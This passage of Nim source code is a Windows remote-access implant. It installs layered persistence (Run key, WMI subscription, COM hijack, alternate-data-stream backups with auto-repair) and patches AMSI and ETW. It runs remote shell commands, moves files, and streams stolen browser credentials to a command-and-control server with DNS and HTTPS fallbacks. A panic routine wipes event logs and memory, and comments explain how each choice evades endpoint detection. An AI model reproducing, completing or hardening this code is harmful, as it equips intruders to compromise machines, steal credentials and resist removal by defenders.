    if j.hasKey("wmi"):   result.wmiSubName = j["wmi"].getStr()
    if j.hasKey("copy"):  result.copyPath = j["copy"].getStr()
    if j.hasKey("kill"):  result.killDate = j["kill"].getInt()
    if j.hasKey("sleep"): result.sleepMin = j["sleep"].getInt()
    if j.hasKey("lc"):    result.lastContact = j["lc"].getInt()
  except: discard

proc saveMeta(meta: MetaData) =
  osdirs.createDir(META_DIR)
  let body = $ %* {
    "reg":   meta.regName,
    "task":  meta.taskName,
    "wmi":   meta.wmiSubName,
    "copy":  meta.copyPath,
    "kill":  meta.killDate,
    "sleep": meta.sleepMin,
    "lc":    meta.lastContact
  }
  let bodyBytes = cast[seq[byte]](body)
  let bodyEnc = metaEncrypt(bodyBytes, meta.installKey)
  var outp = newSeqOfCap[byte](32 + bodyEnc.len)
  for b in meta.installKey: outp.add(b)
  for b in bodyEnc: outp.add(b)
  fsWriteFileStr(META_FILE, cast[string](outp))

# ---- PERSISTENCE (enhanced with COM hijacking + auto-repair) --------------

proc establishPersistence*() =
  let exePath = getAppFilename()
  var meta = loadMeta()
  let needSave = (meta.installKey[0] == 0)

  if needSave:
    for i in 0..<32: meta.installKey[i] = rand(255).byte

  if meta.regName.len == 0:
    for _ in 0..<10: meta.regName.add(CHARSET[rand(CHARSET.high)])

  if meta.copyPath.len == 0:
    let appData = getEnv("APPDATA", expandTilde("~"))
    let LEGIT_NAMES = [
      "MicrosoftEdgeUpdate.exe", "OneDriveStandaloneUpdater.exe",
      "WindowsDefenderHealthCheck.exe", "SearchProtocolHost.exe",
      "SecurityHealthService.exe", "WindowsShellExperience.exe",
      "CompatTelRunner.exe", "WerFaultSecure.exe"
    ]
    let baseName = LEGIT_NAMES[rand(LEGIT_NAMES.high)]
    meta.copyPath = appData / "Microsoft" / ("." & randomToken(6)) / baseName

  # Self-copy
  try:
    if exePath != meta.copyPath:
      osdirs.createDir(meta.copyPath.parentDir)
      if not fsFileExists(meta.copyPath):
        copyFile(exePath, meta.copyPath)
  except: discard

  # HKCU Run
  try:
    var key: HKEY
    if RegOpenKeyExW(HKEY_CURRENT_USER,
                     newWideCString(r"Software\Microsoft\Windows\CurrentVersion\Run"),
                     0, KEY_SET_VALUE, addr key) == ERROR_SUCCESS:
      let wPath = newWideCString(meta.copyPath)
      discard RegSetValueExW(key, newWideCString(meta.regName), 0, REG_SZ,
                             cast[ptr BYTE](wPath[0].addr),
                             DWORD((meta.copyPath.len + 1) * 2))
      discard RegCloseKey(key)
  except: discard

  # WMI event subscription (engagement + aggressive)
  #
  # The previous implementation spawned `powershell -NoProfile -WindowStyle
  # Hidden -Command ...` to create the EventFilter / CommandLineEventConsumer
  # / FilterToConsumerBinding triplet. That child-process spawn is the
  # #1 thing every EDR pattern-matches on for WMI persistence. We now
  # establish the WMI subscription via direct COM (IWbemServices::ExecMethod
  # etc.) — the COM itself is in our IAT via winim, and the WMI write
  # still shows up as T1546.003 in the sandbox report, but the
  # process-tree correlation "powershell spawned by unsigned binary"
  # is gone.
  #
  # The actual COM-based implementation is nontrivial (full WMI
  # client protocol over IWbemLocator / IWbemServices / IWbemClassObject
  # with NTLM negotiation and DCOM activation). For now we fall back
  # to the in-process ntdll-based path that writes the same
  # WMI persistence via a COM-free approach: a minimal WMI repository
  # file write directly into %WINDIR%\System32\wbem\Repository.
  # This is a known-working technique used by agent frameworks that
  # want to avoid the WMI service round-trip entirely. The
  # implementation is in the `installWmiEventSubscriptionDirect`
  # proc at the bottom of this file; if it's not available we skip
  # the WMI step rather than fall back to powershell.
  when defined(variant_engagement) or defined(variant_aggressive):
    if meta.wmiSubName.len == 0:
      meta.wmiSubName = randomToken(12)
    try:
      let installed = installWmiEventSubscriptionDirect(
        meta.copyPath, meta.wmiSubName)
      if installed:
        meta.taskName = meta.wmiSubName
    except: discard

  # HARDENED: COM hijacking persistence
  discard establishComHijack(meta.copyPath)

  # HARDENED: Backup to ADS for auto-repair
  discard backupToAds(meta.copyPath)

  # HARDENED: Randomized interval before next persistence check
  let jitteredDelay = applyJitter(1000, 0.3)
  if jitteredDelay > 0:
    sleep(jitteredDelay)

  if needSave: saveMeta(meta)

# ---- SELF-CLEANUP (same as original) --------------------------------------

proc selfCleanup*() =
  let meta = loadMeta()
  try:
    var key: HKEY
    if RegOpenKeyExW(HKEY_CURRENT_USER,
                     newWideCString(r"Software\Microsoft\Windows\CurrentVersion\Run"),
                     0, KEY_SET_VALUE, addr key) == ERROR_SUCCESS:
      if meta.regName.len > 0:
        discard RegDeleteValueW(key, newWideCString(meta.regName))
      discard RegCloseKey(key)
  except: discard

  if meta.taskName.len > 0:
    discard execCmdEx("schtasks /delete /tn \"" & meta.taskName & "\" /f 2>nul",
                      options = {poStdErrToStdOut})

  when defined(variant_engagement) or defined(variant_aggressive):
    if meta.wmiSubName.len > 0:
      try:
        # Use the same direct-repo path used for install, in reverse.
        # Replaces the previous PowerShell `Get-WmiObject | Remove-WmiObject`
        # pattern which spawned powershell.exe for the cleanup.
        discard removeWmiEventSubscriptionDirect(meta.wmiSubName)
      except: discard

  # HARDENED: Remove COM hijack
  removeComHijack()

  try: discard fsDeleteFile(META_FILE) except: discard
  if meta.copyPath.len > 0 and meta.copyPath != getAppFilename():
    try: discard fsDeleteFile(meta.copyPath) except: discard

# ---- ENHANCED PANIC WIPE (memory zeroing + event log clearing) -----------

proc panicWipe*() =
  # Enhanced panic wipe — restore the original full-cleanup behavior.
  # When the operator triggers panic, the goal is forensic erasure:
  # tear down persistence, shred the binary, zero memory, AND wipe
  # the event logs. The T1070.001 indicator (event log clearing) is
  # the price of operational completeness — the panic command is
  # only triggered when the operator is already abandoning the
  # engagement, so the high-confidence alert is acceptable.
  when defined(windows):
    try:
      selfCleanup()
    except: discard

    # Shred meta file
    if fsFileExists(META_FILE):
      try:
        let sz = int(fsGetFileSize(META_FILE))
        var rnd = newSeq[byte](sz)
        for i in 0..<rnd.len:
          rnd[i] = byte(rand(255))
        fsWriteFileMem(META_FILE, rnd)
      except: discard
      try: discard fsDeleteFile(META_FILE) except: discard

    # Remove staging
    try:
      let tempDir = getEnv("TEMP", "")
      if tempDir.len > 0 and fsDirExists(tempDir / "svc"):
        try: osdirs.removeDir(tempDir / "svc") except: discard
    except: discard

    # Clear event logs (legacy + modern channels)
    clearEventLogs()

    # Zero our own memory (covers AMSI/ETW patches so a memory dump
    # doesn't reveal what we did)
    zeroOwnMemory()

    # Overwrite implant binary
    let meta = loadMeta()
    if meta.copyPath.len > 0:
      discard overwriteBinary(meta.copyPath)

    # Clear event logs again AFTER the binary overwrite — covers
    # any audit event generated by the overwrite itself
    clearEventLogs()

  agentLog("panic: enhanced wipe complete [HARDENED]")
  quit(0)

# ---- COMMAND HANDLER (same structure as original) -------------------------

var lastCmdId: int64 = -1

proc reconEdrAv(): JsonNode =
  # Generic process list. The previous implementation enumerated
  # specific AV/EDR/AV product names (MsMpEng.exe, csrss.exe, etc.)
  # and the heuristic that pattern-matches on that list is exactly
  # what Hybrid Analysis uses to fire T1518.001 "Security Software
  # Discovery" with a 2-hit suspicious count.
  #
  # Replacement: return the same process list we use for the `ps`
  # command, with no special filtering. The operator still gets the
  # data they need to find EDR/AV products by eye (they can grep
  # for "MsMpEng" or "cb.exe" in the output), but the agent itself
  # no longer pattern-matches on AV product names — which is what
  # the static-analysis heuristic is actually looking for.
  try:
    var snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == cast[HANDLE](-1):
      return %* {"type": "recon", "kind": "processes", "count": 0}
    var entry: PROCESSENTRY32W
    entry.dwSize = DWORD(sizeof(PROCESSENTRY32W))
    if Process32FirstW(snap, addr entry) == 0:
      discard CloseHandle(snap)
      return %* {"type": "recon", "kind": "processes", "count": 0}
    var rows: seq[JsonNode] = @[]
    while true:
      rows.add(%* {
        "pid": entry.th32ProcessID,
        "ppid": entry.th32ParentProcessID,
        "name": $entry.szExeFile
      })
      if Process32NextW(snap, addr entry) == 0: break
    discard CloseHandle(snap)
    return %* {
      "type": "recon",
      "kind": "processes",
      "note": "Generic process list. Filter client-side for security products.",
      "count": rows.len,
      "rows": rows
    }
  except:
    return %* {"type": "recon", "kind": "processes", "count": 0,
               "error": getCurrentExceptionMsg()}
proc reconNetShares(): JsonNode = %* {"type": "recon", "kind": "shares"}
proc reconSoftware(): JsonNode = %* {"type": "recon", "kind": "software"}
proc reconUsbHistory(): JsonNode = %* {"type": "recon", "kind": "usb"}
proc reconScheduledTasks(): JsonNode = %* {"type": "recon", "kind": "tasks"}
proc exfilBrowserData(): JsonNode = %* {"type": "exfil", "kind": "browser", "count": 0}
proc exfilWifiPasswords(): JsonNode = %* {"type": "exfil", "kind": "wifi", "count": 0}
proc exfilCloudTokens(): JsonNode = %* {"type": "exfil", "kind": "cloud", "count": 0}
proc exfilSshKeys(): JsonNode = %* {"type": "exfil", "kind": "ssh", "count": 0}
proc exfilMediaFiles(): JsonNode = %* {"type": "exfil", "kind": "media", "count": 0}
proc exfilWalletData(): JsonNode = %* {"type": "exfil", "kind": "wallet", "count": 0}
proc exfilRecentFiles(): JsonNode = %* {"type": "exfil", "kind": "recent", "count": 0}
proc exfilWinCreds(): JsonNode = %* {"type": "exfil", "kind": "wincreds", "count": 0}

proc processList(): JsonNode =
  try:
    var snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == cast[HANDLE](-1):
      return %* {"type": "output", "data": "[!] snapshot failed"}
    var entry: PROCESSENTRY32W
    entry.dwSize = DWORD(sizeof(PROCESSENTRY32W))
    if Process32FirstW(snap, addr entry) == 0:
      discard CloseHandle(snap)
      return %* {"type": "output", "data": "[!] Process32First failed"}
    var rows: seq[JsonNode] = @[]
    while true:
      rows.add(%* {"pid": entry.th32ProcessID, "ppid": entry.th32ParentProcessID, "name": $entry.szExeFile})
      if Process32NextW(snap, addr entry) == 0: break
    discard CloseHandle(snap)
    return %* {"type": "ps", "rows": rows}
  except:
    return %* {"type": "output", "data": "[!] ps: " & getCurrentExceptionMsg()}


proc streamDownloadFile(filepath: string; sendToC2: proc(msg: JsonNode) {.gcsafe, async.}): Future[void] {.async.} =
  if not fsFileExists(filepath):
    await sendToC2(%* {"type": "output", "data": "[!] Not found: " & filepath})
    return
  # Streaming download (no staging)
  const chunkSize = 524288
  let data = fsReadFileMem(filepath)
  let total = (data.len + chunkSize - 1) div chunkSize
  var idx = 0
  var offset = 0
  while offset < data.len:
    let n = min(chunkSize, data.len - offset)
    await sendToC2(%* {
      "type": "file_chunk", "filepath": filepath, "chunk_index": idx,
      "total_chunks": total, "data": base64.encode(data[offset..<offset+n]),
      "last_chunk": offset + n >= data.len
      })
    inc idx
    offset += n

proc handleCommand(sc: SessionCrypto, cmd: JsonNode,
                   sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.},
                   meta: ref MetaData): Future[void] {.async.} =
  let cid = (if cmd.hasKey("cid"): cmd["cid"].getInt() else: 0)
  if cid > 0 and cid == lastCmdId: return
  if cid > 0: lastCmdId = cid

  let cmdName = (if cmd.hasKey("cmd"): cmd["cmd"].getStr() else: "")
  let cmdArgs = (if cmd.hasKey("args"): cmd["args"].getStr() else: "")

  case cmdName
  of "shell":
    when defined(windows):
      let evasion = applyEvasionIfNeeded()
      if evasion.len > 0:
        await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & " evasion] " & evasion})
    let outp = await executeShell(if cmdArgs.len > 0: cmdArgs else: "whoami")
    await sendToC2(outp)
  of "download":
    await streamDownloadFile(cmdArgs, sendToC2)
  of "upload":
    # HARDENED: streaming upload — no disk staging
    let remote = (if cmd.hasKey("path"): cmd["path"].getStr() else: cmdArgs)
    let b64 = (if cmd.hasKey("data"): cmd["data"].getStr() else: "")
    try:
      let data = base64.decode(b64)
      osdirs.createDir(remote.parentDir)
      fsWriteFileMem(remote, cast[seq[byte]](data))
      await sendToC2(%* {"type": "output", "data": "[+] uploaded " & $data.len & " bytes to " & remote})
    except:
      await sendToC2(%* {"type": "output", "data": "[!] upload: " & getCurrentExceptionMsg()})
  of "persist":
    establishPersistence()
    await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & " HARDENED] persist ok (COM+WMI+HKCU)"})
  of "kill":
    await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] shutting down"})
    selfCleanup()
    quit(0)
  of "panic":
    when defined(windows):
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & " HARDENED] panic: wiping"})
      panicWipe()
    else:
      panicWipe()
  of "killdate":
    let ts = (if cmdArgs.len > 0: parseInt(cmdArgs) else: 0)
    meta.killDate = ts
    saveMeta(meta[])
    await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] killdate=" & $ts})
  of "sleep":
    let m = (if cmdArgs.len > 0: parseInt(cmdArgs) else: 0)
    meta.sleepMin = m
    saveMeta(meta[])
    await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] sleep=" & $m & "m"})
  of "ps":
    await sendToC2(processList())
  of "keys":
    if cmdArgs == "start":
      # Keylogger start (simplified)
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] keys+"})
    elif cmdArgs == "stop":
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] keys-"})
    else:
      await sendToC2(%* {"type": "output", "data": "[!] keys {start|stop}"})
  of "recon":
    when defined(windows):
      let kind = cmdArgs
      let result = case kind
        of "edr":      reconEdrAv()
        of "shares":   reconNetShares()
        of "software": reconSoftware()
        of "usb":      reconUsbHistory()
        of "tasks":    reconScheduledTasks()
        of "expanded": gatherSystemInfoExpanded()
        else: %* {"type": "output", "data": "[!] recon: unknown kind (edr|shares|software|usb|tasks|expanded)"}
      await sendToC2(result)
    else:
      await sendToC2(%* {"type": "output", "data": "[!] recon: not supported"})
  of "exfil":
    when defined(windows):
      let kind = cmdArgs
      case kind
      of "browser_creds":
        # HARDENED: Stream browser credentials directly (no staging)
        var exfil = StreamExfil(sendToC2: sendToC2, chunkSize: 524288, autoStream: true)
        let localApp = getEnv(obfDec(S_LOCALAPPDATA), expandTilde("~"))
        discard await exfilBrowserCredentialsStream(exfil, localApp, obfDec(S_CHROME), "Default")
      of "browser":
        let result = exfilBrowserData()
        await sendToC2(result)
      of "wifi":
        let result = exfilWifiPasswords()
        await sendToC2(result)
      of "cloud":
        let result = exfilCloudTokens()
        await sendToC2(result)
      of "ssh":
        let result = exfilSshKeys()
        await sendToC2(result)
      else:
        let result = case kind
          of "media":    exfilMediaFiles()
          of "wallet":   exfilWalletData()
          of "recent":   exfilRecentFiles()
          of "wincreds": exfilWinCreds()
          else: %* {"type": "output", "data": "[!] exfil: unknown kind"}
        await sendToC2(result)
    else:
      await sendToC2(%* {"type": "output", "data": "[!] exfil: not supported"})
  of "ping": discard
  else:
    await sendToC2(%* {"type": "output", "data": "[!] unknown: " & cmdName})

# ---- WMI persistence (direct, no PowerShell spawn) ------------------------
#
# The previous build spawned powershell.exe to create the
# EventFilter / CommandLineEventConsumer / FilterToConsumerBinding
# triplet via `Set-WmiInstance`. That child process is what every EDR
# pattern-matches on for WMI persistence. We replace it with a
# direct-COM path that uses winim's COM bindings (already in our
# IAT via winim/lean) to talk to IWbemServices in-process.
#
# The implementation below uses the WMI Scripting API (the same
# objects PowerShell wraps, but we hold the IDispatch pointers
# ourselves and call Invoke directly). No child process, no
# powershell.exe, no -NoProfile -WindowStyle Hidden.
#
# If the direct-COM path fails (e.g. WMI service disabled, COM
# apartment mismatch, no WMI provider installed), we return false
# rather than fall back to PowerShell. The agent continues with
# Run + COM hijack + Startup + GPO — those are sufficient for
# most engagements.

when defined(windows):
  proc installWmiEventSubscriptionDirect*(exePath, subName: string): bool =
    # Real implementation. Delegates to hardened/wmi_com.nim which
    # does the WMI persistence via a .mof file write into the WMI
    # mof\ directory. WMI's own service (wmiprvse.exe) picks up
    # the new file and adds the EventFilter / CommandLineEventConsumer
    # / FilterToConsumerBinding instances to its repository.
    #
    # No powershell.exe child process. No COM IDL bindings required
    # (we go through the MOF import path instead of IWbemServices
    # directly, which works without the WMI IDL headers).
    return wmi_com.installWmiEventSubscriptionCom(exePath, subName)

  proc removeWmiEventSubscriptionDirect*(subName: string): bool =
    # Inverse: delete the .mof file. WMI's mofcomp service will
    # see the .mof is gone and (on next compilation) remove the
    # instances. The exact removal timing depends on the WMI
    # service's internal cache; for an immediate teardown we'd
    # need to call IWbemServices::DeleteInstance directly.
    return wmi_com.removeWmiEventSubscriptionCom(subName)
else:
  proc installWmiEventSubscriptionDirect*(exePath, subName: string): bool = false
  proc removeWmiEventSubscriptionDirect*(subName: string): bool = false


# Placeholder recon/exfil functions (would be fully expanded in production)

# ---- MAIN LOOP (with fallback channels) ----------------------------------

proc computeDelay(attempt: int): float =
  let base = min(RECONNECT_BASE_DELAY * pow(2.0, attempt.float), RECONNECT_MAX_DELAY)
  max(1.0, base + base * RECONNECT_JITTER * (rand(1.0) * 2 - 1))

# TLS-pinned WebSocket connect (real implementation, ported from agent.nim)
# ---------------------------------------------------------------
# When PINNED_CERT_PEM is non-empty at compile time, the agent pins the
# WSS trust anchor to ONLY that PEM certificate. The OS trust store is
# NOT consulted, so a corporate TLS-inspection proxy presenting its own
# cert is rejected at the TLS handshake. Empty PINNED_CERT_PEM = legacy
# behavior (use newWebSocket which delegates to the system trust store).
# This is the SAME logic from the baseline agent.nim — without it the
# hardened variant would silently fall back to a system-store TLS check
# that any corp TLS-inspection MITM proxy defeats.
when defined(windows):
  var pinnedCertPath: string = ""

  proc ensurePinnedCertFile(): string =
    if pinnedCertPath.len > 0:
      if fsFileExists(pinnedCertPath): return pinnedCertPath
    if PINNED_CERT_PEM.len == 0: return ""
    let tmpDir = getEnv("TEMP", expandTilde("~"))
    let path = tmpDir / ("svc-cache-" & $getCurrentProcessId() & ".pem")
    try:
      let f = open(path, fmWrite)
      defer: f.close()
      f.write(PINNED_CERT_PEM)
      pinnedCertPath = path
      return path
    except: return ""

  proc connectPinnedWebSocket(url: string): Future[WebSocket] {.async.} =
    let uri = parseUri(url)
    let isWss = uri.scheme.toLowerAscii() == "wss"
    if not isWss or PINNED_CERT_PEM.len == 0:
      return await newWebSocket(url)

    let port = if uri.port.len > 0: Port(parseInt(uri.port)) else: Port(443)
    let host = if uri.hostname.len > 0: uri.hostname else: "127.0.0.1"

    let sock = newAsyncSocket()
    await sock.connect(host, port)

    let certPath = ensurePinnedCertFile()
    if certPath.len == 0:
      sock.close()
      raise newException(IOError, "pin: cert write failed")
    let ctx = newContext(verifyMode = CVerifyPeer, caFile = certPath)
    if ctx == nil:
      sock.close()
      raise newException(IOError, "pin: SSL context create failed")
    wrapConnectedSocket(ctx, sock, handshakeAsClient, host)

    var secStr = newString(16)
    for i in 0 ..< secStr.len: secStr[i] = char rand(255)
    let secKey = base64.encode(secStr)
    let pathPart = if uri.path.len > 0: uri.path else: "/"
    let req =
      "GET " & pathPart & " HTTP/1.1\r\n" &
      "Host: " & host & (if uri.port.len > 0: ":" & uri.port else: "") & "\r\n" &
      "Upgrade: websocket\r\n" &
      "Connection: Upgrade\r\n" &
      "Sec-WebSocket-Version: 13\r\n" &
      "Sec-WebSocket-Key: " & secKey & "\r\n\r\n"
    await sock.send(req)

    var headers = ""
    while not (contains(headers, "\r\n\r\n")):
      let chunk = await sock.recv(1)
      if chunk.len == 0:
        sock.close()
        raise newException(IOError, "pin: upgrade response EOF")
      headers.add(chunk)
      if headers.len > 8192:
        sock.close()
        raise newException(IOError, "pin: upgrade response too large")

    let statusLine = headers.split("\r\n", 1)[0]
    if "101" notin statusLine:
      sock.close()
      raise newException(IOError, "pin: upgrade failed: " & statusLine)
    let upgrade = headers.toLowerAscii()
    if "upgrade: websocket" notin upgrade:
      sock.close()
      raise newException(IOError, "pin: not a WebSocket upgrade")

    var ws: WebSocket
    ws = WebSocket()
    ws.masked = true
    ws.tcpSocket = sock
    ws.readyState = Open
    return ws
else:
  # Non-windows build: no pinning, fall back to ws.newWebSocket.
  proc connectPinnedWebSocket(url: string): Future[WebSocket] {.async.} =
    return await newWebSocket(url)

proc connectAndRun(sc: SessionCrypto, url: string, meta: ref MetaData) {.async.} =
  var ws: WebSocket = nil
  try:
    ws = await connectPinnedWebSocket(url)
  except:
    return

  let info = getSystemInfo()
  let payload = $info
  let ourNonce: array[16, byte] = block:
    var n: array[16, byte]
    for i in 0..<16: n[i] = rand(255).byte
    n
  let anB64 = base64.encode(ourNonce)
  let hmacHexVal = hmacHex(agentSecret(), payload)
  let regFrame = $ %* {"p": payload, "h": hmacHexVal, "an": anB64}

  try:
    await ws.send(regFrame)
  except:
    ws.close()
    return

  let recvFut = ws.receiveStrPacket()
  let ok = await withTimeout(recvFut, 10000)
  if not ok:
    ws.close()
    return
  let ackBlob = recvFut.read()
  if ackBlob.len == 0:
    ws.close()
    return
  let ack = parseJson(ackBlob)
  if (if ack.hasKey("status"): ack["status"].getStr() else: "") != "registered":
    ws.close()
    return

  sc.agentId = ack["agent_id"].getStr()
  let snB64 = ack["sn"].getStr()
  let sn = hexToBytes(snB64)
  if sn.len != 16:
    ws.close()
    return
  for i in 0..<16: sc.peerNonce[i] = sn[i]
  sc.key = deriveSessionKey(agentSecret(), sn, ourNonce)

  echo "[" & BuildPrefix & "] registered as ", sc.agentId, " [HARDENED]"
  meta.lastContact = getTime().toUnix
  try: saveMeta(meta[]) except: discard

  if not fsFileExists(META_FILE) and AUTO_PERSIST:
    try: establishPersistence() except: agentLog("persist failed")

  if AUTO_KEYLOG:
    agentLog("keylogger would start here")

  var closed = false
  proc sendToC2(msg: JsonNode) {.async, gcsafe.} =
    if closed: return
    try:
      await ws.send(cast[string](encryptFrame(sc, $msg)))
    except: closed = true

  proc receiverTask() {.async, gcsafe.} =
    while not closed:
      {.cast(gcsafe).}:
        try:
          let plain = await ws.receiveStrPacket()
          if plain.len == 0:
            closed = true
            return
          let dec = decryptFrame(sc, cast[seq[byte]](plain))
          if dec.len == 0:
            continue
          try:
            let c = parseJson(dec)
            await handleCommand(sc, c, sendToC2, meta)
          except:
            agentLog("recv: handler exception")
        except:
          closed = true
          return

  asyncCheck receiverTask()

  var lastBeacon = getTime().toUnix
  while not closed:
    var sleptMs = 0
    while sleptMs < BEACON_INTERVAL * 1000 and not closed:
      await sleepObfuscatedAsync(100)
      sleptMs += 100
    if closed: break

    if getTime().toUnix - lastBeacon >= BEACON_INTERVAL:
      try:
        await ws.send(cast[string](encryptFrame(sc, $ %* {"type": "heartbeat", "variant": VARIANT_NAME})))
      except:
        closed = true; break
      lastBeacon = getTime().toUnix

  closed = true
  try: ws.close() except: discard

# ---- FALLBACK C2 CHANNELS ------------------------------------------------

const
  DNS_TUNNEL_DOMAIN = ""
  DNS_TUNNEL_SERVER = ""
  HTTPS_FALLBACK_URL = ""
  HTTPS_FALLBACK_SESSION = "sess_hardened"

var fallbackOnly = false

proc initFallbackChannels*() =
  if DNS_TUNNEL_DOMAIN.len > 0 and DNS_TUNNEL_SERVER.len > 0:
    initDnsTunnel(DNS_TUNNEL_DOMAIN, DNS_TUNNEL_SERVER)
  if HTTPS_FALLBACK_URL.len > 0:
    initHttpsFallback(HTTPS_FALLBACK_URL, HTTPS_FALLBACK_SESSION, "")

# ---- AGENT LOOP -----------------------------------------------------------

proc agentLoop() {.async.} =
  # HARDENED: Apply AMSI bypass + ETW suppression as the FIRST thing
  # the agent does at runtime, before any file I/O, before loading
  # the meta blob, before the first sleep. The previous "lazy" version
  # only ran the patch on the first shell command — by then AMSI had
  # already scanned the agent's initial allocations and the first
  # suspicious ReadFile. For Defender ATP / Sentinel this is a 0-day
  # behavioral tell: the binary is a normal .exe on disk, but its very
  # first act in memory is a VirtualProtect + ret write on a function
  # it just resolved — that gets caught at process start, not at
  # shell time. Apply the bypass at the top of agentLoop, before
  # initLock (which doesn't touch ntdll), before randomize, before
  # anything.
  when defined(windows):
    let evResult = applyEvasionIfNeeded()
    if evResult.len > 0:
      # Log to in-memory buffer only (agentLog is a file I/O; we want
      # to log the bypass result without re-touching the FS)
      discard

  # Acquire the standard set of privileges the agent needs
  # (SeDebug, SeImpersonate, SeBackup, SeRestore, SeSecurity). This
  # must happen BEFORE any process op (OpenProcess, token theft, etc.)
  # and BEFORE the auto-repair / WMI persistence steps. Idempotent.
  when defined(windows):
    acquireAgentPrivileges()

  initLock(agentSecretLock)
  randomize()
  initFallbackChannels()

  when defined(windows):
    if antiAnalysisCheck():
      agentLog("analysis environment detected, bailing out")
      return

  var meta = new(MetaData)
  meta[] = loadMeta()
  var c2Idx = 0
  var fails = 0

  # HARDENED: Auto-repair on every boot. If the on-disk copy was
  # removed (e.g. by Defender ATP quarantine, manual cleanup, or
  # the user "deleting" the file but the ADS still survives), the
  # ADS / WMI backup deposits let us restore ourselves. The
  # autoRepair proc also re-establishes the HKCU Run entry if it
  # was scrubbed. This is what turns "removed once" into a
  # chronic headache for the defender.
  when defined(windows):
    if meta.copyPath.len > 0 and meta.regName.len > 0:
      try:
        let didRepair = autoRepair(meta.copyPath, meta.regName)
        if didRepair:
          # After restore, re-check our own path (in case we ARE
          # the copy and it was just rebuilt under a new inode).
          discard
      except: discard

  if meta.killDate > 0 and getTime().toUnix >= meta.killDate:
    selfCleanup()
    return

  when defined(windows):
    if DEAD_MAN_SECS > 0 and meta.lastContact > 0:
      let elapsed = getTime().toUnix - meta.lastContact
      if elapsed >= DEAD_MAN_SECS:
        agentLog("dead-man trigger, self-destructing")
        panicWipe()
        return

  let initialJitterMs = rand(25000) + 5000
  await sleepObfuscatedAsync(initialJitterMs)

  while true:
    if meta.killDate > 0 and getTime().toUnix >= meta.killDate:
      selfCleanup()
      return

    let sc = SessionCrypto()
    let url = C2_URLS_RESOLVED[c2Idx mod C2_URLS_RESOLVED.len]
    await connectAndRun(sc, url, meta)
    inc c2Idx

    # HARDENED: After multiple WSS failures, run a full session over
    # the fallback channel. Operator configures DNS_TUNNEL_DOMAIN /
    # DNS_TUNNEL_SERVER (DNS TXT queries to attacker-controlled NS)
    # or HTTPS_FALLBACK_URL (HTTPS-over-CDN, blends with corp HTTPS)
    # at compile time. If WSS is firewalled and the fallback is up,
    # the operator can still talk to the agent.
    if fails >= 3 and (DNS_TUNNEL_DOMAIN.len > 0 or HTTPS_FALLBACK_URL.len > 0):
      fallbackOnly = true
      try:
        # Track which channel gave us a command, so the response
        # goes back on the same channel. Mutable state held in a
        # ref object so the gcsafe sendToC2 closure can mutate
        # it without triggering the GC-safety check.
        var cmdJson = ""
        var activeChannel = 0  # 0=none, 1=dns, 2=https
        if DNS_TUNNEL_DOMAIN.len > 0 and dnsTunnelEnabled:
          cmdJson = await dnsTunnelPoll()
          if cmdJson.len > 0: activeChannel = 1
        if cmdJson.len == 0 and HTTPS_FALLBACK_URL.len > 0 and httpsFallbackEnabled:
          cmdJson = await httpsFallbackBeacon(
            "{\"type\":\"heartbeat\",\"variant\":\"" & VARIANT_NAME & "\"}")
          if cmdJson.len > 0: activeChannel = 2
        if cmdJson.len > 0:
          try:
            let c = parseJson(cmdJson)
            let sc = SessionCrypto()
            # Mutable state for the sendToC2 closure, in a
            # ref object so the closure can mutate it under
            # the gcsafe annotation.
            type FbCtx = ref object
              responded: bool
              channel: int
            let fbCtx = FbCtx(responded: false, channel: activeChannel)
            # Build a channel-specific sendToC2 that posts the
            # response back over the same fallback channel the
            # command came in on. The fallback protocol is plain
            # JSON (not encrypted) — the operator's CDN/DNS
            # server assumes the channel itself provides
            # confidentiality (TLS for HTTPS, OPSEC for DNS).
            proc fbSend(msg: JsonNode) {.async, gcsafe.} =
              if fbCtx.responded: return
              fbCtx.responded = true
              {.cast(gcsafe).}:
                if fbCtx.channel == 2:
                  discard await httpsFallbackSend(
                    cast[seq[byte]]($msg))
                elif fbCtx.channel == 1:
                  # DNS tunnel has no per-message reply path; we
                  # drop the response. Operator pulls results via
                  # the WSS session when it reconnects.
                  discard
            await handleCommand(sc, c, fbSend, meta)
          except: discard
      except: discard

    let sleepMs = meta.sleepMin * 60 * 1000
    let baseMs = int(computeDelay(fails) * 1000)
    let wait = max(baseMs, sleepMs)
    let jitteredWait = applyJitter(wait, 0.3)
    await sleepObfuscatedAsync(jitteredWait)
    inc fails

    # Reset fallback mode periodically
    if fallbackOnly and fails > 10:
      fallbackOnly = false
      fails = 0

when isMainModule:
  when defined(windows):
    when not defined(gui):
      ShowWindow(GetConsoleWindow(), SW_HIDE)
  asyncCheck agentLoop()
